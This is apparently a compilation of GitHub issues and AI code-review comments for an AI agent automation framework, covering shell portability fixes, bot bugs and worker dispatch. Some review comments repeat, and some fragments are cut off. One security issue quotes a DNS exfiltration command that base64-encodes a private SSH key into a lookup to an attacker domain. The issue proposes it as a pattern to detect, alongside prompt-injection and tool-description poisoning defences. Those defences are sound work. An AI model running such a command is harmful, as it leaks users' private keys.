![medium](https://www.gstatic.com/codereviewagent/medium-priority.svg)

To improve performance and script efficiency, it's best to consolidate the multiple `jq` calls that read from `$HISTORY_FILE` into a single pass. You can compute all the necessary historical statistics (1-day, 7-day, 28-day, 365-day, and total) in one `jq` invocation and then read them into shell variables. This avoids reading and parsing the same file multiple times, which is especially beneficial if the history file grows large.

```shell
 local history_days=0 history_total=0
 local hist_1d=0 hist_7d=0 hist_28d=0 hist_365d=0
 if [[ -f "$HISTORY_FILE" ]]; then
  history_days=$(wc -l <"$HISTORY_FILE" | tr -d ' ')
  if [[ "$history_days" -gt 0 ]]; then
   # Read all history stats in one jq call for efficiency
   local history_stats
   history_stats=$(jq -s '
    . as $all |
    [
     ([$all[].screen_hours] | add // 0),
     ([$all[-1:][].screen_hours] | add // 0 | . * 10 | round / 10),
     ([$all[-7:][].screen_hours] | add // 0 | . * 10 | round / 10),
     ([$all[-28:][].screen_hours] | add // 0 | . * 10 | round / 10),
     ([$all[-365:][].screen_hours] | add // 0 | . * 10 | round / 10)
    ] | @tsv
   ' "$HISTORY_FILE" 2>/dev/null)

   # shellcheck disable=SC2086
   read -r history_total hist_1d hist_7d hist_28d hist_365d <<<"$history_stats"
  fi
 fi

 # If live 7d/28d returned 0 but we have history, use history instead
 if [[ "$history_days" -gt 0 ]]; then
  if [[ "$(echo "$week_hours == 0" | bc)" -eq 1 ]]; then
   week_hours="${hist_7d:-0}"
  fi
  if [[ "$(echo "$month_hours == 0" | bc)" -eq 1 ]]; then
   month_hours="${hist_28d:-0}"
  fi
  if [[ "$(echo "$day_hours == 0" | bc)" -eq 1 ]]; then
   day_hours="${hist_1d:-0}"
  fi
 fi

 # For 365 days: use accumulated history if available, else extrapolate
 local year_hours
 if [[ "$history_days" -gt 0 ]]; then
  local daily_avg
  daily_avg=$(echo "scale=2; ${history_total:-0} / $history_days" | bc)
  if [[ "$history_days" -ge 365 ]]; then
   # Have a full year of data — use last 365 days from history
   year_hours="${hist_365d:-0}"
  else
   # Extrapolate from available data
   year_hours=$(echo "scale=1; $daily_avg * 365" | bc)
  fi
```

<summary>References</summary>

1. Consolidate multiple 'jq' calls into a single pass where possible to improve performance and script efficiency.

title: t1426: Cache person_stats hourly to eliminate Search API rate limit exhaustion
body:
## Problem

`update_health_issues()` runs every pulse (every 2 min) and calls `person-stats` + `cross-repo-person-stats` each time. These make 4 GitHub Search API calls per contributor (issues created, PRs created, PRs merged, commented on).

With 2 repos and ~5 unique contributors: 44 Search API calls per pulse vs 30/min limit. The function sleeps 56s waiting for reset, blocking the pulse cycle. Combined with the PID race (t1425), this created 18+ zombie processes.

The data — "who created how many issues/PRs in the last 30 days" — changes at most hourly.

## Fix

Add `_refresh_person_stats_cache()` with a 1-hour timestamp guard. Results cached to `~/.aidevops/logs/person-stats-cache-*.md`. `update_health_issues()` and `_update_health_issue_for_repo()` read from cache instead of computing live.

Reduces Search API usage from ~1320/hr to ~44/hr. Removes need for rate limit guards.

## Files

- `.agents/scripts/pulse-wrapper.sh` — add `_refresh_person_stats_cache()`, update callers to read cache

title: t1428: Grith-inspired security enhancements — composite scoring, quarantine digest, MCP description audit, DNS exfil detection, session summary
body:
## Summary

Gap analysis of aidevops security stack against [Grith.ai](https://grith.ai)'s zero-trust AI agent security model identified 5 genuine gaps after deep audit of existing capabilities (~20 security files reviewed).

**What we already cover well (no gap):** prompt injection detection (70+ patterns + LLM classifier), MCP tool poisoning awareness (mcporter.md security section), network egress controls (5-tier, 222 domains), tamper-evident audit trail (hash-chained JSONL), worker credential isolation, skill supply chain scanning, CI/CD AI agent security guidance, privacy filter, terminal security.

## 5 Genuine Gaps

### t1428.1 — DNS exfiltration detection (~2h)
CVE-2025-55284 demonstrated `dig $(cat ~/.ssh/id_rsa | base64).attacker.com` bypasses network allowlists. Our Tier 5 blocks known DNS exfil services but not attacker-owned domains. Add patterns to `prompt-injection-patterns.yaml` and `sandbox-exec-helper.sh` for DNS exfil command shapes.

### t1428.2 — MCP tool description runtime scanning (~3h)
We scan tool outputs (Pattern B) and source code (skill-scanner at import), but not tool descriptions at runtime. Descriptions enter model context as trusted instructions. Create `mcp-audit-helper.sh` that fetches tool descriptions via `mcporter list --json` and runs `prompt-guard-helper.sh scan` on each.

### t1428.3 — Session-scoped composite security scoring (~5h)
Binary allow/block per-check but no multi-signal accumulation. No correlation between "session read sensitive file" and "session making outbound request." Add session security context that accumulates signals across operations for lightweight taint tracking.

### t1428.4 — Quarantine digest with learn feedback (~5h)
Flagged items go to separate logs nobody reviews. Create unified quarantine queue with approve/deny/learn actions. "Learn" feeds back into `network-tiers-custom.conf` or `prompt-guard-custom.txt`, creating a self-improving feedback loop.

### t1428.5 — Unified post-session security summary (~3h)
Data exists across 4+ separate commands but no single view. Enhance `session-review-helper.sh` with `--security` mode aggregating cost, security events, flagged domains, quarantine items.

## References

- Plan: `todo/PLANS.md` (p044)
- Brief: `todo/tasks/t1428-brief.md`
- Grith blog posts analyzed: 7-agent audit, MCP tool poisoning, 2857 skills audit, Clinejection, SSH key theft via DNS exfil, IDEsaster 24 CVEs, OpenClaw banned, vibe coding OSS impact, "What Grith Means"

title: Matrix bot setup: multiple bugs and UX improvements needed
body:
## Summary

During first-time Matrix Synapse + bot setup on Cloudron, multiple issues were encountered that would affect any user following the same path.

## Bugs

### 1. `sendTyping` is not a function (crash)
**File:** `matrix-dispatch-helper.sh` → generated `bot.mjs`
**Issue:** Bot script uses `client.sendTyping()` but the `matrix-bot-sdk` version installed exposes `client.setTyping()`. Bot crashes on first message dispatch.
**Fix:** Replace `sendTyping` with `setTyping` in the `generate_bot_script()` function.

### 2. AutojoinRoomsMixin crashes on stale/deleted room invites
**File:** `matrix-dispatch-helper.sh` → generated `bot.mjs`
**Issue:** `AutojoinRoomsMixin.setupOnClient(client)` throws an unhandled error when the bot has pending invites to rooms that no longer exist (e.g., encrypted rooms that were deleted and recreated). This crashes the entire bot process.
**Fix:** Replace `AutojoinRoomsMixin` with a manual `room.invite` handler that wraps `joinRoom` in try/catch:
```js
client.on("room.invite", async (roomId, inviteEvent) => {
    try {
        await client.joinRoom(roomId);
    } catch (err) {
        console.warn(`Failed to join room ${roomId}: ${err.message} — skipping`);
    }
});
```

### 3. Bot doesn't join mapped rooms on startup
**Issue:** If the bot is added to rooms while it's not running, or rooms are created before the bot starts, it never joins them. It only joins on invite events.
**Fix:** Add startup loop that joins all rooms in `config.roomMappings` after `client.start()`.

### 4. Setup wizard silently exits after homeserver URL
**Issue:** `matrix-dispatch-helper.sh setup` prompts for homeserver URL, then exits without prompting for access token or other fields. Likely a `read` issue with stdin buffering.
**Impact:** Users cannot complete interactive setup. Workaround is to write `matrix-bot.json` manually.

## UX Improvements

### 5. FluffyChat forces encryption on new rooms
**Issue:** FluffyChat (Android) auto-enables encryption on new rooms with no way to disable it during creation. The Matrix bot cannot read encrypted messages. Users must create rooms via the Synapse API instead, which is a poor first-time experience.
**Recommendation:** Document this in `matrix-bot.md` setup guide — include the curl commands to create unencrypted rooms via the admin API as the primary path, not as a fallback.

### 6. Stale invite cleanup not documented
**Issue:** When users delete and recreate rooms (common when fixing encryption), the bot accumulates stale invites that crash it. No documentation or tooling exists to clean these up.
**Recommendation:** Add a `matrix-dispatch-helper.sh cleanup-invites` command that rejects all pending invites to rooms not in the room mappings.

## Environment
- Synapse on Cloudron (Hetzner)
- matrix-bot-sdk (npm, latest)
- Node.js v25.6.0
- FluffyChat (Android)

title: t1430: Research rtk-ai/rtk CLI proxy for token reduction integration
body:
## Summary

Evaluate [rtk-ai/rtk](https://github.com/rtk-ai/rtk) (5.8k stars, MIT, Rust) as a token-saving layer for aidevops.

rtk is a CLI proxy that intercepts command outputs (`ls`, `cat`, `grep`, `git`, test runners) and compresses/filters them before they reach the LLM context, claiming 60-90% token reduction with <10ms overhead. Single Rust binary, zero dependencies.

## Research Questions

1. **Compatibility** — does rtk work with aidevops agent dispatch, worktree workflows, and headless mode?
2. **Integration points** — complement or conflict with existing file discovery rules (`git ls-files`, `fd`, `rg` per build.txt)?
3. **Cost savings** — project savings from observability metrics (actual token usage per session)
4. **Parsing safety** — could rtk's output filtering break agent tool parsing (structured JSON, error detection, exit codes)?
5. **Deployment** — installation via `setup.sh`, cross-platform (macOS, Linux)
6. **Comparison** — how does rtk compare with our prompt-level token discipline (build.txt rules)?

## Deliverable

Recommendation with evidence: adopt / adapt / ignore. If adopt, integration plan as subtasks.

## Labels

research, evaluation, cost-optimization

**File**: `.agents/scripts/stats-wrapper.sh:59`
![high](https://www.gstatic.com/codereviewagent/high-priority.svg)

The use of `date -d` on line 56 introduces a portability issue, as this option is a GNU extension and is not available on macOS/BSD systems, which this repository appears to support. This will cause the script to fail when checking the age of a running process on macOS.

A more portable and simpler approach is to use `ps -o etimes=` which directly provides the elapsed time of the process in seconds. This avoids the need for parsing dates and works on both Linux and macOS.

```suggestion
	local elapsed
	elapsed=$(ps -p "$old_pid" -o etimes= 2>/dev/null | tr -d ' ')

	# If ps fails or the process has disappeared, elapsed will be empty.
	# In this case, we can clean up the PID file and allow a new run.
	if [[ -z "$elapsed" ]]; then
		rm -f "$STATS_PIDFILE"
		return 0
	fi
```

[View comment](https://github.com/marcusquinn/aidevops/pull/4094#discussion_r2914191440)
---

### CRITICAL: coderabbit (coderabbitai[bot])
**File**: `.agents/scripts/stats-wrapper.sh:67`
_⚠️ Potential issue_ | _🔴 Critical_

<details>
<summary>🧩 Analysis chain</summary>

🌐 Web query:

`Does macOS's BSD `date` support `date -d "<string>" +%s`? What portable approach is recommended in Bash for computing process age on both macOS and Linux?`

💡 Result:

No. The `/bin/date` shipped with macOS is the BSD-derived `date(1)` and does **not** support GNU `date`’s `-d/--date` parsing mode (and BSD `date` even notes that an old `-d` option was removed). Instead, BSD `date` uses `-j -f <input_fmt>` to parse a timestamp string (via `strptime(3)`) and can output epoch seconds with `+%s`. [1]

On Linux, `date -d "<string>" +%s` is supported because it’s GNU coreutils `date` (`-d/--date`). [2]

### Portable Bash approach to compute “process age” on macOS + Linux
Prefer asking `ps` for *elapsed time* rather than parsing a start timestamp with `date`:

1) **If available, use seconds directly (Linux commonly supports this):**
```bash
age_s=$(ps -o etimes= -p "$pid")
```

2) **On macOS, use `etime` (available) and convert to seconds in Bash/AWK** (macOS `ps` provides `etime` but not `etimes`). [3]
```bash
etime=$(ps -o etime= -p "$pid" | tr -d ' ')
age_s=$(
  awk -v t="$etime" '
    function tosec(h,m,s){return h*3600+m*60+s}
    BEGIN{
      # formats: [[dd-]hh:]mm:ss  (common ps etime style)
      n=split(t,a,/-|:/)
      if (index(t,"-")) { d=a[1]; h=a[2]; m=a[3]; s=a[4] }
      else if (n==3)    { d=0;    h=a[1]; m=a[2]; s=a[3] }
      else              { d=0;    h=0;    m=a[1]; s=a[2] }
      print d*86400 + tosec(h,m,s)
    }'
)
```

If you *must* parse a “start time” string portably, you generally end up branching: GNU `date -d ...` on Linux vs BSD `date -j -f ...` on macOS (or install GNU `gdate` via coreutils on macOS). [1][2][4]

**Sources:** FreeBSD/BSD `date(1)` options (`-j`, `-f`, `-r`) and history note about `-d` removal [1]; GNU coreutils `date` supports `-d/--date` for parsing [2]; macOS `ps(1)` format keywords include `etime` (elapsed running time) [3]; note that macOS `date` lacks `--date`/`-d` and uses `-j -f` as workaround [4].

---



</details>

**Use a portable process-age check here.**

`ps -o lstart` + `date -d` is GNU-specific and fails on macOS—`date` falls back to `start_epoch=0`, causing elapsed time to be calculated as ~1.7 billion seconds (current epoch minus 0). The next invocation will treat any live stats process as stale and kill it.

Replace with `ps -o etimes=` (Linux) or parse `ps -o etime=` via AWK (macOS), or use a cross-platform helper that handles both `date -d` and `date -j -f` branches.

<details>
<summary>🤖 Prompt for AI Agents</summary>

```

calculation using start_time and date -d in stats-wrapper.sh is GNU-specific and
breaks on macOS; update the logic in the block that computes start_epoch/elapsed
(variables start_time, start_epoch, now, elapsed, and constants
STATS_TIMEOUT/STATS_PIDFILE) to use a portable check: prefer ps -o etimes= to
get seconds on Linux, fall back to parsing ps -o etime= output into seconds via
awk on macOS (or use date -j -f when needed), and only then compute elapsed and
compare to STATS_TIMEOUT; ensure the fallback paths handle errors (set
start_epoch to now or 0 appropriately) and keep the same kill/remove sequence
when elapsed > STATS_TIMEOUT.
```

title: auto-update-helper.sh: pull --ff-only fails silently on diverged/dirty repo, blocks updates indefinitely
body:
**Describe the bug**

`auto-update-helper.sh check` uses `git pull --ff-only` to update `~/Git/aidevops`, but when the working tree has local changes (dirty files from `setup.sh` chmod, scan results, etc.) or the branch has diverged from `origin/main`, the pull fails and the auto-updater logs the error but takes no corrective action. It retries every 10 minutes with the same result, indefinitely.

This is a **recurring** problem — the logs show **130 pull failures** across multiple version ranges (v2.133.11→v2.134.x stuck for 30+ hours, v2.144.0→v2.145.x stuck for 3+ hours, v2.158.1→v2.164.x stuck for 3+ hours, v2.170.0→v2.170.2 stuck until manual intervention).

A secondary failure mode was also observed: **106 instances** of `remote=unknown` (GitHub API returning empty/error) from 20:53 Mar 10 to 06:20 Mar 11, likely due to unauthenticated API rate limiting (60 req/hr limit, with 6 checks/hr this is fine alone, but other tools may share the quota).

**Root cause**

The manual `aidevops update` command (`cmd_update()` in `aidevops.sh`) already handles both failure modes correctly:

1. **Lines 664-673**: Cleans dirty working tree before pull (`git reset HEAD -- .` + `git checkout -- .`)
2. **Lines 656-662**: Ensures we're on the `main` branch (handles detached HEAD)
3. **Lines 708-718**: Falls back to `git reset --hard origin/main` when `--ff-only` fails

The auto-update helper (`auto-update-helper.sh` `cmd_check()`) has **none of these safeguards** — it just does `git pull --ff-only` and gives up on failure.

**To reproduce**

1. Make any local change in `~/Git/aidevops` (e.g., `touch ~/Git/aidevops/foo`)
2. Wait for auto-update to detect a new version
3. Observe repeated `git pull --ff-only failed (local changes?)` errors every 10 minutes
4. Updates are blocked until manual `aidevops update` or manual cleanup

**Expected behavior**

Auto-update should apply the same recovery logic as `aidevops update`:
1. Ensure on `main` branch
2. Clean dirty working tree (`git reset HEAD -- . && git checkout -- .`)
3. Attempt `git pull --ff-only`
4. If still fails, fall back to `git reset --hard origin/main`

The `~/Git/aidevops` repo is a managed install directory — it should always track `origin/main` exactly. Local changes are never intentional and should be discarded during auto-update.

Additionally, the `remote=unknown` failure should have a retry with the raw.githubusercontent.com fallback, and ideally use authenticated requests when `gh` auth is available.

**Environment**

- OS: macOS (Darwin)
- aidevops version: 2.171.5
- Shell: zsh
- Scheduler: launchd (com.aidevops.aidevops-auto-update, every 600s)

**Impact**

- 130 failed pull attempts logged since Feb 19
- Multiple multi-hour windows where auto-update was completely blocked
- User was on v2.170.2 while v2.171.5 was available — 119 commits behind
- Only resolved by manual `aidevops update` in terminal

**Proposed fix**

Port the recovery logic from `cmd_update()` (aidevops.sh:656-718) into `cmd_check()` (auto-update-helper.sh). Specifically:
1. Before pull: ensure on `main`, clean working tree
2. After pull failure: fall back to `git reset --hard origin/main`
3. For `remote=unknown`: use `gh api` with auth token when available, add retry logic

**References**

- https://github.com/marcusquinn/aidevops/issues/2286 (setup.sh leaving dirty tree)
- https://github.com/marcusquinn/aidevops/issues/2288 (ff-only fallback in manual update)

## Problem

## Root cause

## Fix
Update pulse dispatch guidance to include an explicit backlog fallback: when queue utilization is low, search and dispatch from `priority:critical` / `priority:high` / `bug`, then `quality-debt` candidates even without `auto-dispatch` labels, while respecting existing debt caps and safeguards.

- [ ] Documents traceability comment for fallback-dispatched issues

title: quality-feedback-helper.sh: verify findings exist on main before creating issues
body:
## Problem

The `quality-feedback-helper.sh scan-merged` scanner creates quality-debt issues from PR review comments, but does not verify whether the findings still exist in the current code on `main`. This produces a high false-positive rate — in a manual audit of the 20 most recent quality-debt issues, **9 out of 20 (45%)** were already resolved on `main`.

### Root cause

The scanner extracts findings from PR review comments (CodeRabbit, Gemini) and files issues referencing specific file:line locations. However:
1. Many findings are addressed in follow-up commits within the same PR before merge
2. Some findings are addressed by subsequent PRs that touch the same files
3. The scanner checks the review comments but not the current state of the code

### Impact

- Maintainer time wasted triaging already-fixed issues
- Issue count inflated, making real debt harder to find
- Workers dispatched to fix non-existent problems (59min wasted on one such dispatch observed)

## Proposed Fix

Before creating a quality-debt issue, the scanner should:

1. **Extract the file path and code pattern** from the review finding
2. **Check if the pattern still exists on `main`**: `git show main:<file> | grep -q '<pattern>'`
3. **Skip issue creation** if the finding is no longer present, logging: `"[scan] Skipping resolved finding: <file>:<line> — pattern not found on main"`
4. For findings that reference specific code suggestions (diff format), check if the suggested fix is already applied

### Verification approach

For each finding, the scanner already has:
- `file` — the file path
- `line` — the line number
- `body` — the review comment (often contains the problematic code snippet)

Extract a unique code snippet from the finding body (the `suggestion` block or the quoted code) and check if it still exists at or near the referenced line on `main`.

### Edge cases

- File deleted entirely → skip (finding resolved by removal)
- File exists but line shifted → search within ±20 lines
- Finding is about missing code (e.g., "add explicit return") → harder to verify; these can still be filed but flagged as "unverifiable"

## Evidence

Issues verified as already-fixed during manual audit:
#4152, #4153, #4154, #4157, #3691, #4149, #4151, #3686, #3796

title: pulse: auto-stop and annotate zero-commit high-message worker thrashing
body:
## Problem
During pulse, multiple workers were running for 7-9 hours with zero commits and extreme message volume (struggle_ratio around 44797), consuming capacity without progress.

## Evidence
- 4 concurrent workers on webapp issues (#1041, #1046, #1052, #1037)
- Uptime ranged about 7 hours or more with no commits
- Pulse had to kill and retry them manually

## Why this matters
This burns tokens and worker slots, delays critical issues, and requires manual intervention each pulse cycle.

## Proposed fix
1. Add a pulse guardrail: if uptime is above a configurable threshold and commits equals zero with high message count, auto-stop the worker.
2. Post an automatic issue comment with blocker context before stop (last known objective and retry guidance).
3. Mark the task as blocked (or equivalent queue status) so the next pulse does not blindly re-run the same strategy.
4. Add a small regression test for the detection heuristic and state transition behavior.

## Acceptance criteria
- Thrashing workers are terminated automatically under the heuristic
- The linked issue gets a machine-generated blocker comment
- Pulse does not immediately relaunch the same failing strategy without changed conditions
- Behavior is covered by tests

title: t1450: Pulse: enforce helper-only dispatch and immediate provider fallback
body: Reduce worker-start failures by enforcing headless-runtime-helper dispatch paths and requiring immediate same-cycle fallback when provider auth/token refresh fails. Add explicit pulse instructions to retry failed launches with alternate provider/model and continue filling slots.

title: t1451: Runtime helper should retry alternate provider on startup auth failure
body:
## Problem
Pulse/worker startup can fail immediately with auth refresh errors (for example, token refresh 400). Guidance-level fallback exists, but the runtime helper exits on first auth failure, which can waste worker slots.

## Proposed fix
Implement deterministic same-cycle fallback in headless-runtime-helper.sh so auth-classified startup failures trigger one immediate retry on an alternate configured provider/model.

## Acceptance criteria
- cmd_run retries once on auth_error without requiring a new pulse cycle.
- Token refresh errors are classified as auth_error.
- Explicit --model runs do not auto-fallback.
- Non-auth failures keep existing behavior.

title: t1452: Pulse should validate worker launch success and avoid unsupported CLI flags
body:
## Problem
Recent pulse cycles showed worker redispatch commands using unsupported opencode flags (for example `--max-iterations` on `opencode run`). Those commands exited into usage output instead of launching workers, silently wasting slots until manual correction.

## Evidence
- Pulse log captured launches with `--max-iterations` followed by worker logs containing `opencode run [message..]` help output.
- Pulse then had to relaunch the same workers with corrected options.
- Occupancy appeared full in pulse state while effective worker execution was lower.

## Root cause hypothesis
The pulse agent can improvise raw `opencode run` invocations during recovery, despite guidance to use `headless-runtime-helper.sh`. Without a launch-validation guard, failed starts look like dispatch success.

## Proposed systemic fix
1. Strengthen pulse dispatch contract: helper-only dispatch, explicit ban on unsupported flags for raw opencode invocations.
2. Add post-dispatch validation step in pulse instructions:
   - verify process exists,
   - verify startup log is not CLI usage/help output,
   - if invalid, relaunch immediately via helper and annotate issue.
3. Add a small deterministic helper/check script for launch validation so pulse can run one command instead of ad-hoc checks.

## Acceptance criteria
- Pulse guidance explicitly forbids unsupported `opencode run` flags in worker dispatch.
- Dispatch flow includes launch-validation and immediate correction path.
- Documented validation catches usage-output false starts before cycle end.

title: bug: Screenshots exceeding Anthropic API 8000px limit cause vision requests to hang
body:
## Summary

Screenshots captured by `browser-qa-helper.sh` (and manual screenshots used in visual comparison workflows) can exceed Anthropic's 8000px per-dimension limit for vision API requests. When this happens, the API rejects the image with:

```
messages.3.content.177.image.source.base64.data: At least one of the image dimensions exceed max allowed size: 8000 pixels
```

This causes the process to hang rather than fail gracefully, blocking visual comparison and QA workflows.

## Observed In

- Theme migration visual comparison (before/after screenshot review)
- Full-page screenshots of long pages easily exceed 8000px in height
- `browser-qa-helper.sh screenshot --full-page` is the most common trigger

## Root Cause

1. **No image preprocessing before API submission.** Neither `browser-qa-helper.sh` nor the framework's vision/image-understanding guidance documents the 8000px Anthropic limit or enforces it.
2. **`fullPage: true` in Playwright** captures the entire scrollable page, which on content-heavy pages produces images well over 8000px tall.
3. **No resize step** exists between screenshot capture and API submission. The raw PNG is base64-encoded and sent directly.

## Workaround Applied

Manually resized screenshots using macOS `sips`:

```bash
sips --resampleHeightWidthMax 4000 input.png --out output.png
```

4000px max dimension keeps images well under the 8000px API limit while preserving sufficient detail for visual comparison.

## Proposed Fix

### 1. Add auto-resize to `browser-qa-helper.sh` screenshot capture

After Playwright captures each screenshot, resize any image exceeding a configurable max dimension (default 4000px) using `sips` (macOS built-in) or `magick` (ImageMagick, cross-platform):

```bash
# After screenshot capture, resize if needed (sips is built into macOS)
local max_dim="${BROWSER_QA_MAX_IMAGE_DIM:-4000}"
for img in "$output_dir"/*.png; do
  local width height
  width=$(sips -g pixelWidth "$img" | awk '/pixelWidth/{print $2}')
  height=$(sips -g pixelHeight "$img" | awk '/pixelHeight/{print $2}')
  if [[ "$width" -gt "$max_dim" || "$height" -gt "$max_dim" ]]; then
    sips --resampleHeightWidthMax "$max_dim" "$img" --out "$img"
  fi
done
```

### 2. Document the Anthropic vision API image size limit

Add to `.agents/tools/vision/image-understanding.md`:

- Anthropic API: max 8000px per dimension for base64 images
- Recommended: resize to 4000px max before submission (safety margin)
- `sips --resampleHeightWidthMax 4000` (macOS) or `magick input.png -resize '4000x4000>'` (cross-platform)

### 3. Add `--max-dim` flag to `browser-qa-helper.sh screenshot`

Allow callers to control the max dimension:

```bash
browser-qa-helper.sh screenshot --url http://localhost:3000 --full-page --max-dim 4000
```

## Files to Modify

- `.agents/scripts/browser-qa-helper.sh` — add post-capture resize step + `--max-dim` flag
- `.agents/tools/vision/image-understanding.md` — document provider image size limits
- `.agents/tools/browser/browser-qa.md` — note the resize behaviour in screenshot docs

## Impact

Any workflow that captures full-page screenshots and sends them to Anthropic's vision API is affected. This includes:
- `browser-qa-helper.sh run` (full QA pipeline)
- `browser-qa-helper.sh screenshot --full-page`
- Manual screenshot comparison workflows (theme migrations, visual regression)
- Milestone validation with UI components (`workflows/milestone-validation.md`)

title: bug: aidevops secret set saves command string instead of secret value
body:
## Summary

When users run `aidevops secret set SECRET_NAME`, the system sometimes saves the **command string itself** instead of the actual secret value. This happens when:

1. User doesn't realize the command is prompting for input
2. User hits Enter without pasting the value
3. The system saves `aidevops secret set SECRET_NAME` as the secret value

## Investigation Notes

**Root cause**: The `aidevops secret` command prompts for input, but users often:
- Don't realize it's waiting for input
- Hit Enter expecting it to use a value they previously copied

**Evidence**:
```
$ gopass show aidevops/SHOPIFY_STORE_API_CLIENT_ID
aidevops secret set SHOPIFY_STORE_API_CLIENT_ID
```
The secret contains the command string, not the actual value.

## Secondary Issue: zxcvbn false positive

API keys/tokens trigger "Password is too systematic" warning because they contain random alphanumeric strings that resemble hashes.

## Suggested Fixes

1. **Clearer prompts**: Change from `aidevops secret set NAME` to explicit prompts
2. **Confirmation**: After saving, display first 3 chars as confirmation
3. **Bypass flag**: Add `--force` or `--no-check` to skip zxcvbn for API keys
4. **List by name only**: `aidevops secret list` should show what's stored (not values)

## Impact

- Users cannot access their secrets (tokens saved as command strings)
- Repeated failed attempts lead to frustration and security risks
- Blocks automation workflows

## Reproduction

1. Run `aidevops secret set TEST_KEY`
2. Don't paste a value, just press Enter
3. Check: `gopass show aidevops/TEST_KEY` → shows command string

title: Add remote MCP consumer configuration guide to build-mcp.md
body:
## Context

While configuring a third-party remote MCP (Ahrefs) for a project, the existing `tools/build-mcp/build-mcp.md` was found to cover **building** MCP servers but has **no guidance on consuming/configuring third-party remote MCPs**. This caused ~15 tool calls of investigation to figure out patterns that should be documented once and reused across all projects.

## What's Missing

A "Consuming Remote MCPs" section covering:

1. **OpenCode remote MCP config schema** — `type: remote`, `url`, `headers`, `oauth`, `timeout` fields. Currently undocumented in the framework; had to fetch from opencode.ai/config.json.

2. **Secure key injection pattern** — Reusable for any authenticated remote MCP:
   ```bash
   jq --arg key "$(gopass show -o <path>)" \
     '.mcp.<name>.headers.Authorization = "Bearer " + $key' config.json
   ```
   Avoids exposing keys in conversation context.

3. **Auth debugging guide** — Quick reference:
   - 401 = no auth sent
   - 403 = auth valid but plan/scope blocked
   - 405 = wrong HTTP method/transport (need Streamable HTTP POST with `Accept: application/json, text/event-stream`)

4. **Local vs remote MCP distinction** — Local MCP (STDIO, often wraps REST API with different plan requirements) vs remote MCP (Streamable HTTP, hosted by provider, may work on plans that block REST API).

## Proposed Change

~30 lines as a new section "Consuming Remote MCPs" appended to the existing `tools/build-mcp/build-mcp.md`. Framework-level guidance — applies to any project adding third-party MCPs (Ahrefs, Outscraper, DataForSEO, etc.).

## Origin

Session: qs-agency, configuring Ahrefs MCP. The knowledge was hard-won and is immediately reusable.

The original construct `if ! var=$(command)` is a bash-specific extension. While separating the command execution and output capture from checking its exit code via `$?` is an improvement, further clarity and robustness can be achieved by adhering to two best practices:
1.  Capture the command's exit code in a local variable (e.g., `local rc=$?`) instead of using `$?` directly in conditionals. This aligns with ShellCheck SC2181 and improves clarity for multi-way branches.

```suggestion
local scan_result

    skip_ai_resolution=true
elif [[ "$scan_result" == *"SUSPICIOUS"* || "$scan_result" == *"BLOCKED"* ]]; then
    log_warn "resolve_rebase_conflicts: prompt injection detected in $conflict_file — skipping AI resolution"
    log_warn "  Scan result: $scan_result"
    skip_ai_resolution=true
fi
```

The use of `date -d` on line 56 introduces a portability issue, as this option is a GNU extension and is not available on macOS/BSD systems, which this repository appears to support. This will cause the script to fail when checking the age of a running process on macOS.

A more portable and simpler approach is to use `ps -o etimes=` which directly provides the elapsed time of the process in seconds. This avoids the need for parsing dates and works on both Linux and macOS.

```suggestion
	local elapsed
	elapsed=$(ps -p "$old_pid" -o etimes= 2>/dev/null | tr -d ' ')

	# If ps fails or the process has disappeared, elapsed will be empty.
	# In this case, we can clean up the PID file and allow a new run.
	if [[ -z "$elapsed" ]]; then
		rm -f "$STATS_PIDFILE"
		return 0
	fi
```

[View comment](https://github.com/marcusquinn/aidevops/pull/4094#discussion_r2914191440)

### CRITICAL: coderabbit (coderabbitai[bot])
**File**: `.agents/scripts/stats-wrapper.sh:67`
_⚠️ Potential issue_ | _🔴 Critical_

<details>
<summary>🧩 Analysis chain</summary>

🌐 Web query:

`Does macOS's BSD `date` support `date -d "<string>" +%s`? What portable approach is recommended in Bash for computing process age on both macOS and Linux?`

💡 Result:

No. The `/bin/date` shipped with macOS is the BSD-derived `date(1)` and does **not** support GNU `date`’s `-d/--date` parsing mode (and BSD `date` even notes that an old `-d` option was removed). Instead, BSD `date` uses `-j -f <input_fmt>` to parse a timestamp string (via `strptime(3)`) and can output epoch seconds with `+%s`. [1]

On Linux, `date -d "<string>" +%s` is supported because it’s GNU coreutils `date` (`-d/--date`). [2]

### Portable Bash approach to compute “process age” on macOS + Linux
Prefer asking `ps` for *elapsed time* rather than parsing a start timestamp with `date`:

1) **If available, use seconds directly (Linux commonly supports this):**
```bash
age_s=$(ps -o etimes= -p "$pid")
```

2) **On macOS, use `etime` (available) and convert to seconds in Bash/AWK** (macOS `ps` provides `etime` but not `etimes`). [3]
```bash
etime=$(ps -o etime= -p "$pid" | tr -d ' ')
age_s=$(
  awk -v t="$etime" '
    function tosec(h,m,s){return h*3600+m*60+s}
    BEGIN{
      # formats: [[dd-]hh:]mm:ss  (common ps etime style)
      n=split(t,a,/-|:/)
      if (index(t,"-")) { d=a[1]; h=a[2]; m=a[3]; s=a[4] }
      else if (n==3)    { d=0;    h=a[1]; m=a[2]; s=a[3] }
      else              { d=0;    h=0;    m=a[1]; s=a[2] }
      print d*86400 + tosec(h,m,s)
    }'
)
```

If you *must* parse a “start time” string portably, you generally end up branching: GNU `date -d ...` on Linux vs BSD `date -j -f ...` on macOS (or install GNU `gdate` via coreutils on macOS). [1][2][4]

**Sources:** FreeBSD/BSD `date(1)` options (`-j`, `-f`, `-r`) and history note about `-d` removal [1]; GNU coreutils `date` supports `-d/--date` for parsing [2]; macOS `ps(1)` format keywords include `etime` (elapsed running time) [3]; note that macOS `date` lacks `--date`/`-d` and uses `-j -f` as workaround [4].

---



</details>

**Use a portable process-age check here.**

`ps -o lstart` + `date -d` is GNU-specific and fails on macOS—`date` falls back to `start_epoch=0`, causing elapsed time to be calculated as ~1.7 billion seconds (current epoch minus 0). The next invocation will treat any live stats process as stale and kill it.

Replace with `ps -o etimes=` (Linux) or parse `ps -o etime=` via AWK (macOS), or use a cross-platform helper that handles both `date -d` and `date -j -f` branches.

title: t1456: count all full-loop workers in pulse utilization accounting
body:
## Problem
Pulse utilization accounting currently counts only issue workers (`/full-loop Implement issue #...`). During PR-heavy mode, many workers run PR advancement prompts (`/full-loop Advance PR #...`), so occupancy is undercounted and backfill logic misfires.

## Root cause
Worker matcher was narrowed to issue-only patterns to avoid supervisor prompt noise, but that excluded valid PR workers.

## Proposed fix
- count any real `.opencode run` full-loop worker (`/full-loop ...`) while excluding supervisor `/pulse` processes and `Supervisor Pulse` titles
- update pulse command guidance snippet to use the same all-full-loop matcher

## Acceptance criteria
- utilization accounting includes both issue and PR workers
